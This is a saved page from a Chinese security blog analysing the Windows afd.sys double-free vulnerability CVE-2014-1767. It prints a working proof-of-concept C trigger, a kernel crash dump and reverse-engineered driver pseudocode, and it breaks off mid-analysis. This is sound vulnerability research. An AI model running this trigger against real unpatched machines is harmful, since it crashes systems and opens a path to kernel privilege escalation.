<!DOCTYPE html>
<!-- saved from url=(0091)http://www.secniu.com/cve-2014-1767-afd-sys-double-free-vulnerability-analysis-and-exploit/ -->
<html lang="zh-CN"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
<!--[if lte IE 7]><script>window.location.href='http://cdn.dmeng.net/upgrade-your-browser.html';</script><![endif]-->
<title>CVE-2014-1767 Afd.sys double-free vulnerability Analysis and Exploit - Binary Vuln Analysis - Vulnerability Analysis - SecNiu</title>
<meta name="description" content="">
<meta name="keywords" content="CVE-2014-1767 Afd.sys double-free vulnerability Analysis and Exploit,CVE-2014-1767,Exploit,Privilge Escalation,Binary Vuln Analysis,Vulnerability Analysis,">
<meta property="og:title" content="CVE-2014-1767 Afd.sys double-free vulnerability Analysis and Exploit - Binary Vuln Analysis - Vulnerability Analysis - SecNiu">
<meta property="og:description" content="">
<meta property="og:url" content="http://www.secniu.com/cve-2014-1767-afd-sys-double-free-vulnerability-analysis-and-exploit/">
<meta property="og:site_name" content="SecNiu">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<!-- Bootstrap -->
<link href="./CVE-2014-1767 Afd.sys double-free vulnerability Analysis and Exploit - Binary Vuln Analysis - Vulnerability Analysis - SecNiu_files/bootstrap.min.css" rel="stylesheet" media="screen">
<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
<script src="http://www.secniu.com/wp-content/themes/dmeng2014/js/html5shiv.js"></script>
<script src="http://www.secniu.com/wp-content/themes/dmeng2014/js/respond.min.js"></script>
<![endif]-->
<link href="./CVE-2014-1767 Afd.sys double-free vulnerability Analysis and Exploit - Binary Vuln Analysis - Vulnerability Analysis - SecNiu_files/style.css" rel="stylesheet" media="screen">
<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
<script type="text/javascript" async="" src="./CVE-2014-1767 Afd.sys double-free vulnerability Analysis and Exploit - Binary Vuln Analysis - Vulnerability Analysis - SecNiu_files/ga.js.下载"></script><script src="./CVE-2014-1767 Afd.sys double-free vulnerability Analysis and Exploit - Binary Vuln Analysis - Vulnerability Analysis - SecNiu_files/jquery.js.下载"></script>
<!-- Include all compiled plugins (below), or include individual files as needed -->
<script src="./CVE-2014-1767 Afd.sys double-free vulnerability Analysis and Exploit - Binary Vuln Analysis - Vulnerability Analysis - SecNiu_files/bootstrap.min.js.下载"></script>
<link rel="alternate" type="application/rss+xml" title="SecNiu » CVE-2014-1767 Afd.sys double-free vulnerability Analysis and Exploit Comments Feed" href="http://www.secniu.com/cve-2014-1767-afd-sys-double-free-vulnerability-analysis-and-exploit/feed/">
<link rel="stylesheet" id="jQuery_notice-css" href="./CVE-2014-1767 Afd.sys double-free vulnerability Analysis and Exploit - Binary Vuln Analysis - Vulnerability Analysis - SecNiu_files/jquery.notice.css" type="text/css" media="all">
<link rel="stylesheet" id="codebox-css" href="./CVE-2014-1767 Afd.sys double-free vulnerability Analysis and Exploit - Binary Vuln Analysis - Vulnerability Analysis - SecNiu_files/codebox.css" type="text/css" media="">
<script type="text/javascript" src="./CVE-2014-1767 Afd.sys double-free vulnerability Analysis and Exploit - Binary Vuln Analysis - Vulnerability Analysis - SecNiu_files/WpPineapple.js.下载"></script><script type="text/javascript" src="./CVE-2014-1767 Afd.sys double-free vulnerability Analysis and Exploit - Binary Vuln Analysis - Vulnerability Analysis - SecNiu_files/jquery.js(1).下载"></script>
<script type="text/javascript" src="./CVE-2014-1767 Afd.sys double-free vulnerability Analysis and Exploit - Binary Vuln Analysis - Vulnerability Analysis - SecNiu_files/jquery.notice.js.下载"></script>
<script type="text/javascript" src="./CVE-2014-1767 Afd.sys double-free vulnerability Analysis and Exploit - Binary Vuln Analysis - Vulnerability Analysis - SecNiu_files/codebox.js.下载"></script>
<script type="text/javascript" src="./CVE-2014-1767 Afd.sys double-free vulnerability Analysis and Exploit - Binary Vuln Analysis - Vulnerability Analysis - SecNiu_files/WpPineapple.js(1).下载"></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.secniu.com/xmlrpc.php?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.secniu.com/wp-includes/wlwmanifest.xml"> 
<link rel="prev" title="CVE-2014-4113 sample" href="http://www.secniu.com/cve-2014-4113-sample/">
<link rel="next" title="[EnglishVersion]CVE-2014-1767 Afd.sys double-free vulnerability Analysis and Exploit" href="http://www.secniu.com/englishversioncve-2014-1767-afd-sys-double-free-vulnerability-analysis-and-exploit/">
<meta name="generator" content="WordPress 3.4.2">
<link rel="canonical" href="http://www.secniu.com/cve-2014-1767-afd-sys-double-free-vulnerability-analysis-and-exploit/">
<link rel="shortlink" href="http://www.secniu.com/?p=231">
	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
</head>
<body id="body" style="">
<header>
	<nav id="navbar" class="navbar navbar-default navbar-static-top" role="navigation">
	<div class="container">
	  <!-- Brand and toggle get grouped for better mobile display -->
	  <div class="navbar-header">
		<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
		  <span class="sr-only">切换导航</span>
		  <span class="icon-bar"></span>
		  <span class="icon-bar"></span>
		  <span class="icon-bar"></span>
		</button>
						<div class="site-title"><a class="navbar-brand" href="http://www.secniu.com/"> SecNiu</a></div>
			  </div>

	  <!-- Collect the nav links, forms, and other content for toggling . -->
	  <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
<ul class="nav navbar-nav"><li class=""><a href="http://www.secniu.com/about/">About</a></li>
</ul>		<form class="navbar-form navbar-left" role="search" method="get" id="searchform" action="http://www.secniu.com/">
		  <div class="form-group">
			<input type="text" class="form-control" placeholder="输入关键词搜索" name="s" id="s">
		  </div>
		  <button type="submit" class="btn btn-default" id="searchsubmit"><span class="glyphicon glyphicon-search"></span></button>
		</form>
	  </div><!-- /.navbar-collapse -->
	  </div>
	</nav>
</header>
<div class="container">

<article itemscope="" itemtype="http://schema.org/Article">
<div class="col-lg-8 col-md-8 content">
<div class="clean"></div>
<div class="panel panel-default">
  <div class="panel-heading">
	<h1 class="pull-left" itemprop="name">CVE-2014-1767 Afd.sys double-free vulnerability Analysis and Exploit</h1>
			<div class="clean"></div>
  </div>
  <div itemprop="articleBody" class="panel-body">
    <h5><a href="http://www.secniu.com/englishversioncve-2014-1767-afd-sys-double-free-vulnerability-analysis-and-exploit/">Hint: Click Me for English Version</a></h5>
<h5><strong><span style="font-family: verdana,geneva"><span style="font-size: large">[0x00].简介</span> </span></strong><br>
<span style="font-family: verdana,geneva">&nbsp; 首先想说的是，之所以分析这个漏洞有几个原因，（1）据载此漏洞在’2014黑客奥斯卡奖Pwnie Awards’中被评为最佳提权漏洞之首（AFD.sys Dangling Pointer Vulnerability (CVE-2014-1767)）。(2) 这个漏洞是一个double free类型漏洞，比较有意思 (3) 迄今只有老外发了一份writeup讲解思路，还没有成功的exp放出，有的探索。本文会从poc开始在windows7 x86平台进行漏洞的原理分析以及实现一个尽量完善的提权利用：）。</span><br>
<span style="font-size: medium"><strong><span style="font-family: verdana,geneva">[0x01]. 漏洞原理分析</span></strong></span><br>
<strong><span style="font-family: verdana,geneva">A. 初窥</span></strong><br>
<span style="font-family: verdana,geneva">我们最权威也是最给力的参考资料就是下面的这个PDF文件。</span><br>
<span style="font-family: verdana,geneva">http://www.siberas.de/papers/Pwn2Own_2014_AFD.sys_privilege_escalation.pdf</span><br>
<span style="font-family: verdana,geneva">我们根据pdf的描述得到以下poc。本实验所有操作都在windows 7 (6.1.7601) 32位系统上完成。</span><br>
<span style="font-family: courier new,courier">=================================================</span></h5>
<h6><span style="font-family: courier new,courier">#include &lt;windows.h&gt;</span><br>
<span style="font-family: courier new,courier">#include &lt;stdio.h&gt;</span><br>
<span style="font-family: courier new,courier">#pragma comment(lib, “WS2_32.lib”)</span><br>
<span style="font-family: courier new,courier">&nbsp;</span><br>
<span style="font-family: courier new,courier">int main()</span><br>
<span style="font-family: courier new,courier">{</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; DWORD targetSize = 0×310 ;</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; DWORD virtualAddress = 0×13371337 ;</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; DWORD mdlSize=(0×4000*(targetSize-0×30)/8)-0xFFF-(virtualAddress&amp; 0xFFF) ;</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; static DWORD inbuf1[100] ;</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; memset(inbuf1, 0, sizeof(inbuf1)) ;</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; inbuf1[6]&nbsp; = virtualAddress ;</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; inbuf1[7]&nbsp; = mdlSize ;</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; inbuf1[10] = 1 ;</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; static DWORD inbuf2[100] ;</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; memset(inbuf2, 0, sizeof(inbuf2)) ;</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; inbuf2[0] = 1 ;</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; inbuf2[1] = 0x0AAAAAAA ;</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; WSADATA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WSAData ;</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; SOCKET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; s ;</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; sockaddr_in&nbsp; sa ;</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ierr ;</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; WSAStartup(0×2, &amp;WSAData) ;</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) ;</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; memset(&amp;sa, 0, sizeof(sa)) ;</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; sa.sin_port = htons(135) ;&nbsp;&nbsp; </span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; sa.sin_addr.S_un.S_addr = inet_addr(“127.0.0.1″) ;</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; sa.sin_family = AF_INET ; </span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; ierr = connect(s, (const struct sockaddr *)&amp;sa, sizeof(sa)) ;</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; static char outBuf[100] ;</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; DWORD bytesRet ;</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; DeviceIoControl((HANDLE)s, 0x1207F, (LPVOID)inbuf1, 0×30, outBuf, 0, &amp;bytesRet, NULL);</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; DeviceIoControl((HANDLE)s, 0x120C3, (LPVOID)inbuf2, 0×18, outBuf, 0, &amp;bytesRet, NULL);</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; return 0 ;</span><br>
<span style="font-family: courier new,courier">}</span></h6>
<h5><span style="font-family: courier new,courier">=================================================</span></h5>
<h5><span style="font-family: verdana,geneva">双机调试poc得到以下crash：</span></h5>
<h5><span style="font-family: courier new,courier">=================================================</span></h5>
<h6><span style="font-family: courier new,courier">BAD_POOL_CALLER (c2)</span></h6>
<h6><span style="font-family: courier new,courier">The current thread is making a bad pool request. &nbsp;</span></h6>
<h6><span style="font-family: courier new,courier">Typically this is at a bad IRQL level or double freeing the same allocation, etc.</span></h6>
<h6></h6>
<h6><span style="font-family: courier new,courier">Arguments:</span></h6>
<h6><span style="font-family: courier new,courier">Arg1: 00000007,&nbsp;<span style="color: #ff9900"><span style="color: #ff6600">Attempt to free pool which was already freed</span></span></span></h6>
<h6><span style="font-family: courier new,courier">Arg2: 00001097, (reserved)</span></h6>
<h6><span style="font-family: courier new,courier">Arg3: 08bd0002, Memory contents of the pool block</span></h6>
<h6><span style="font-family: courier new,courier">Arg4: 854b2a20, Address of the block of pool being deallocated</span></h6>
<h6><span style="font-family: courier new,courier">Debugging Details:</span></h6>
<h6><span style="font-family: courier new,courier">——————</span></h6>
<h6><span style="font-family: courier new,courier">POOL_ADDRESS: &nbsp;854b2a20&nbsp;<span style="color: #ff6600">Nonpaged pool</span></span></h6>
<h6><span style="font-family: courier new,courier">FREED_POOL_TAG:&nbsp;&nbsp;<span style="color: #ff6600">Mdl</span>&nbsp;</span></h6>
<h6><span style="font-family: courier new,courier">STACK_TEXT: &nbsp;</span></h6>
<h6><span style="font-family: courier new,courier">8d524a6083f6dc6b000000c2 00000007 00001097 nt!KeBugCheck2+0x68b</span></h6>
<h6><span style="font-family: courier new,courier">8d524ad8 83ed8ec2 854b2a20 00000000 8636d260 nt!ExFreePoolWithTag+0x1b1</span></h6>
<h6><span style="font-family: courier new,courier">8d524aec 88787eb0 854b2a20 00000000 8876a89f&nbsp;<strong>nt!IoFreeMdl</strong>+0×70</span></h6>
<h6><span style="font-family: courier new,courier">8d524b08 8876a8ac00000000 00000001 05244d85&nbsp;<strong>afd!AfdReturnTpInfo</strong>+0xad</span></h6>
<h6><span style="font-family: courier new,courier">8d524b44 8876bbba 05244d2d 000120c3 8876ba8c&nbsp;<strong>afd!AfdTliGetTpInfo</strong>+0×89</span></h6>
<h6><span style="font-family: courier new,courier">8d524bec 887702bc 854a2db8 86472720 8d524c14&nbsp;<strong>afd!AfdTransmitPackets</strong>+0x12e</span></h6>
<h6><span style="font-family: courier new,courier">8d524bfc 83e83593 864727208540f5508540f550 afd!AfdDispatchDeviceControl+0x3b</span></h6>
<h6></h6>
<h6><span style="font-family: courier new,courier">=================================================</span></h6>
<h5><span style="font-family: verdana,geneva">查看DeviceIoControl参数：</span></h5>
<h5><span style="font-family: verdana,geneva">kd&gt; dd&nbsp;8d524d04</span></h5>
<h5><span style="font-family: verdana,geneva">8d524d04 &nbsp;8d524d34 83e8a1ea 00000050 00000000</span></h5>
<h5><span style="font-family: verdana,geneva">8d524d14 &nbsp;00000000 00000000 001cf984<span style="color: #ff6600">&nbsp;000120c3</span></span></h5>
<h5><span style="font-family: verdana,geneva">可见是DeviceIoControl发送控制码 0x120C3 时候触发了double free漏洞，被释放的对象是一个MDL对象。从调用栈和作者PDF描述看 afd!AfdTransmitPackets 是非常关键的函数，我们会尝试去分析它。但是这之前我们会先去分析 AfdTransmitFile , 因为poc中一共调用了两次 DeviceIoControl, 第一次没有crash，但是实际上第一个恰恰是第一次free！第二个IoCtl是第二次free（由后续分析可知），因此出现了crash！</span><span style="font-family: verdana,geneva">因此分析第一次IoControlCode == 0x1207F的流程必须放在前面了。当IoControlCode=0x1207F时，afd驱动会调用 afd!AfdTransmitFile 函数。下面我们看一下这个函数的执行流程, 通过执行流程的分析我们也会理解DeviceIoControl函数输入缓冲区的内容的设置缘由。</span></h5>
<h5><span style="font-size: medium"><strong><span style="font-family: verdana,geneva">B.第一次DeviceIoControl调用分析( 0x1207F)</span></strong></span><br>
<strong><span style="font-family: verdana,geneva">a. AfdTransmitFile函数分析</span></strong><br>
<span style="font-family: verdana,geneva">AfdTransmitFile有两个参数，arg1 = ecx = pIrp, arg2 = edx = pIoStackLocation</span><br>
<span style="font-family: verdana,geneva">通过IoStackLocation我们就可以访问用户传递的数据了。 我们在 inbuf1 中填充了数值，这些数值肯定是有用的，按照这些值就可以达到我们想要的流程分支。于是开始动态跟踪+静态分析，得出以下与输入缓冲区相关的控制流跳转点：</span><br>
<span style="font-family: courier new,courier">&nbsp;</span></h5>
<h5>AfdTransmitFile(pIrp, pIoStack):<br>
<span style="color: #993300">inputBufferLen &gt;= 0×30</span><br>
<span style="color: #993300"> inputBuffer &amp; 0×3 == 0</span><br>
<span style="color: #993300"> inputBuffer &lt; 0x7fff0000</span><br>
<span style="color: #993300">memcpy(tempBuf, userBuf, 0×30) ;</span><br>
<span style="color: #993300">if(*(DWORD*)tempBuf+0×28) &amp; 0xFFFFFFC8 == 0)</span><br>
<span style="color: #993300">if(*(DWORD*)tempBuf+0×28) &amp; != 0×30)</span><br>
<span style="color: #993300">if(*(DWORD*)tempBuf+0×28) &amp; 0×30 == 0)</span></h5>
<h5><strong><span style="color: #993300;font-family: courier new,courier">tpInfo = AfdGetTpInfo ( 3 )&nbsp; </span></strong><span style="color: #993300;font-family: courier new,courier">// 当上面所有条件成立时，流程进入调用AfdGetTpInfo</span></h5>
<h5><strong><span style="font-family: verdana,geneva">b. AfdTliGetTpInfo分析</span></strong><br>
<span style="font-family: verdana,geneva">这里我们看到当inputBuffer的内容满足以上条件后，AfdTransmitFile会调用 AfdTliGetTpInfo ( 3 ).</span><br>
<span style="font-family: verdana,geneva">AfdTliGetTpInfo同样是一个非常关键的函数，以下是对 AfdTliGetTpInfo的逆向分析：</span><br>
<span style="font-family: verdana,geneva">elemCount是这个函数的的参数，这个函数返回值是一个指向TpInfo结构体的指针，为了深入理解这里的操作我们先说一下TpInfo这个结构体的结构：(本结构定义来自于对AfdTliGetTpInfo, AfdReturnTpInfo, AfdAllocateTpInfo, AfdInitializeTpInfo的综合分析）</span></h5>
<h5>========================</h5>
<h6><span style="font-family: courier new,courier">struct TpInfo {</span><br>
<span style="font-family: courier new,courier">…</span><br>
<span style="font-family: courier new,courier">TpElement&nbsp; *pElemArray ;&nbsp; // +0×20, TpElement数组指针</span><br>
<span style="font-family: courier new,courier">…</span><br>
<span style="font-family: courier new,courier">ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; elemCount&nbsp; ;&nbsp; // +0×28, pElemArray中元素个数</span><br>
<span style="font-family: courier new,courier">… </span><br>
<span style="font-family: courier new,courier">BYTE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; isOuterMem ;&nbsp; // +0×32, pElemArray是否是在本结构体之外申请的内存</span><br>
<span style="font-family: courier new,courier">… </span><br>
<span style="font-family: courier new,courier">}</span></h6>
<h6><span style="font-family: courier new,courier">struct TpElement {</span><br>
<span style="font-family: courier new,courier">int&nbsp;&nbsp; flag ;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // +0×00</span><br>
<span style="font-family: courier new,courier">ULONG length ;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // +0×04</span><br>
<span style="font-family: courier new,courier">PVOID virtualAddress ;&nbsp;&nbsp;&nbsp; // +0×08</span><br>
<span style="font-family: courier new,courier">PMDL&nbsp; pMdl ;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // +0x0C</span><br>
<span style="font-family: courier new,courier">ULONG reserved1 ;</span><br>
<span style="font-family: courier new,courier">ULONG reserved2 ;</span><br>
<span style="font-family: courier new,courier">} ;</span></h6>
<p>===============================<br>
<span style="font-family: verdana,geneva">&nbsp;</span><br>
<span style="font-family: verdana,geneva">AfdTliGetTpInfo函数：</span><br>
<span style="font-family: verdana,geneva">&nbsp;<a href="http://www.secniu.com/cve-2014-1767-afd-sys-double-free-vulnerability-analysis-and-exploit/attachment/4/" rel="attachment wp-att-235"><img class="alignnone size-full wp-image-235" src="./CVE-2014-1767 Afd.sys double-free vulnerability Analysis and Exploit - Binary Vuln Analysis - Vulnerability Analysis - SecNiu_files/4.jpg" alt="" width="825" height="417"></a></span></p>
<h5><span style="font-family: verdana,geneva"> 以上就是函数&nbsp; AfdTliGetTpInfo, 函数会根据参数从一个Lookaside List中申请TpInfo结构体。对于ExAllocateFromNPagedLookasideList，它的大概含义就是：</span><br>
<span style="font-family: verdana,geneva">======================</span></h5>
<h6><span style="font-family: courier new,courier">TpInfo* __stdcall ExAllocateFromNPagedLookasideList(PNPAGED_LOOKASIDE_LIST Lookaside)</span><br>
<span style="font-family: courier new,courier">{</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; *(Lookaside+0x0C) ++ ;</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; tpInfo = InterlockedPopEntrySList( Lookaside )</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; if( tpInfo == NULL)</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; {</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *(Lookaside+0×10)++;</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tpInfo = AfdAllocateTpInfo(NonPagedPool,0×108 ,0xc6646641) ;&nbsp; </span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; }</span><br>
<span style="font-family: courier new,courier">&nbsp;&nbsp;&nbsp; return&nbsp; tpInfo</span><br>
<span style="font-family: courier new,courier">}</span></h6>
<p>=======================</p>
<h5><span style="font-family: verdana,geneva">对于 AfdAllocateTpInfo 它的流程大概是这样的：</span></h5>
<h5>============================</h5>
<h6><span style="color: #000000;font-family: courier new,courier">TpInfo * AfdAllocateTpInfo(POOL_TYPE PoolType, SIZE_T NumberOfBytes, ULONG Tag)</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">{</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;p = ExAllocatePoolWithTagPriority(NonPagedPool, 0×108 0xc6646641) ;</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;AfdInitializeTpInfo(p, 3, 3, 1) ;</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">}</span></h6>
<h5>============================<br>
<span style="font-family: verdana,geneva"> &nbsp;</span><br>
<span style="font-family: verdana,geneva"> AfdInitializeTpInfo是一个初始化数据tpInfo的函数，里面我们关注的几点就是上述定义时候的那几个域的值，</span><br>
<span style="font-family: verdana,geneva">&nbsp;========================</span></h5>
<h6><span style="font-family: courier new,courier"><span style="color: #000000">AfdInitializeTpInfo(tpInfo, elemCount, stacksize, x)</span></span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">{</span></h6>
<h6><span style="font-family: courier new,courier"><span style="color: #000000">&nbsp;&nbsp;&nbsp; </span><span style="color: #000000">….</span></span></h6>
<h6><span style="font-family: courier new,courier"><span style="color: #000000">&nbsp;&nbsp;&nbsp; </span><span style="color: #000000">tpInfo-&gt;pElemArray = tpInfo+0×90</span></span></h6>
<h6><span style="font-family: courier new,courier"><span style="color: #000000">&nbsp;&nbsp;&nbsp; </span><span style="color: #000000">tpInfo-&gt;elemCount</span><span style="color: #000000">&nbsp; </span><span style="color: #000000">= 0</span></span></h6>
<h6><span style="font-family: courier new,courier"><span style="color: #000000">&nbsp;&nbsp;&nbsp; </span><span style="color: #000000">tpInfo-&gt;isOuterMem = false </span></span></h6>
<h6><span style="font-family: courier new,courier"><span style="color: #000000">&nbsp;&nbsp;&nbsp; </span><span style="color: #000000">….</span></span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">}</span></h6>
<p>=========================</p>
<h5><span style="font-family: verdana,geneva">经过调试我们发现，因为这个lookaside list是afd内部使用的。lookaside list在我们调用使用时是空的，因此控制流过走入以下路径：</span><br>
<span style="font-family: verdana,geneva"> ExAllocateFromNPagedLookasideList-&gt;AfdAllocateTpInfo-&gt;AfdInitializeTpInfo，</span><span style="font-family: verdana,geneva">至此，经过alloc我们在ExAllocateFromNPagedLookasideList调用后得到了一个tpInfo结构体。</span><span style="font-family: verdana,geneva">并且这里的pElemArray初始化为 tpInfo+0×90 处的地址，也就是说初始化TpElement数组是存储在tpInfo内部的，可以看到初始化的tpInfo-&gt;isOuterMem 也是0，说明数组存储在结构体内部。有了 isOuterMem 这个成员我们不难猜测，当数组的元素个数比较多的时候自然要额外申请空间，存放数组元素，因为内部空间毕竟有限。这也是isOuterMem这个域的作用。这样AfdTliGetTpInfo内部的if语句就好理解了，当element个数大于3的是，会申请外部内存，并且将isOuterMem置为1，将pElemArray指针也指向新申请的内存。 对于每个数组的元素我也给出了其定义，这是我们调试时候总结出来的，这个结构在32位系统下是0×18字节，每个域的名字都已经标出，大致是存储一些某块内存的相关信息，包括其虚拟地址、长度以及描述它的MDL结构。</span></h5>
<h5><span style="font-family: verdana,geneva">现在转回 AfdTramsmitFile,我们获得了一个TpInfo结构体，下面要做什么呢？</span><br>
<span style="font-family: verdana,geneva">&nbsp;<a href="http://www.secniu.com/cve-2014-1767-afd-sys-double-free-vulnerability-analysis-and-exploit/attachment/5/" rel="attachment wp-att-236"><img class="alignnone size-full wp-image-236" src="./CVE-2014-1767 Afd.sys double-free vulnerability Analysis and Exploit - Binary Vuln Analysis - Vulnerability Analysis - SecNiu_files/5.jpg" alt="" width="817" height="342"></a></span></h5>
<p>&nbsp;</p>
<h5><span style="font-family: verdana,geneva">virtualAddress =&nbsp; *(tempBuf+0×18)&nbsp;&nbsp;&nbsp;&nbsp; // we set this value to 0×13371337, tempBuf&nbsp;内容是从inputBuf拷贝来的</span><br>
<span style="font-family: verdana,geneva"> length&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =&nbsp; *(tempBuf+0x1C)&nbsp;&nbsp;&nbsp; // we also set this</span><br>
<span style="font-family: verdana,geneva"> someFlag&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =&nbsp; *(tempBuf+0×28)&nbsp;&nbsp;&nbsp;&nbsp; // we set this to 1</span></h5>
<h5><span style="font-family: verdana,geneva"> 经过上面三个值的提取与判断，程序会调用 <strong>IoAllocateMdl</strong> 且使用<strong>我们提供的virtualAddress以及length !</strong> 当程序成功申请了一个MDL结构之后，会将mdl地址填充到pElemArray的一个Element中去，然后，调用MmProbeAndLockPages 来尝试锁定mdl描述的内存，就在这个函数的调用中，<strong>MmProbeAndLockPages函数将调用失败！因为无效的地址范围！（0×13371337~0×13371337+length)，</strong></span><strong><span style="font-family: verdana,geneva">此时AfdTramsmitFile将进入异常处理流程 ！异常处理调用AfdReturnTpInfo。</span></strong><br>
<span style="font-family: verdana,geneva"> &nbsp;</span><br>
<span style="font-family: verdana,geneva"> &nbsp;</span></h5>
<h5><strong><span style="font-family: verdana,geneva">c. AfdReturnTpInfo分析：</span></strong><br>
<span style="font-family: verdana,geneva"> 下面是 AfdReturnTpInfo 的一段逆向代码：</span></h5>
<h6><span style="font-family: courier new,courier">===========================</span></h6>
<h6><span style="font-family: courier new,courier"><span style="color: #000000">for(int i = 0 ; i &lt; *(tpInfo+0×28) ; i++)</span></span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">{</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;PTPELEMENT tpElemArray = *(DWORD*)(tpInfo + 0×20) ;</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;PTPELEMENT tpElement = tpElemArray + i*0×18 ;</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;if(*(tpElement) &amp; 0×02 == 0)</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;{</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(*(tpElement) &lt; 0)</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span></h6>
<h6><span style="font-family: courier new,courier"><span style="color: #000000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PMDL pMdl = *(DWORD*)(tpElement+0x</span><span style="color: #000000">0C</span><span style="color: #000000">) ;</span></span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(pMdl != NULL)</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span></h6>
<h6><span style="color: #000000;font-family: courier new,courier">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(pMdl-&gt;MdlFlags &amp; 0×02)</span></h6>
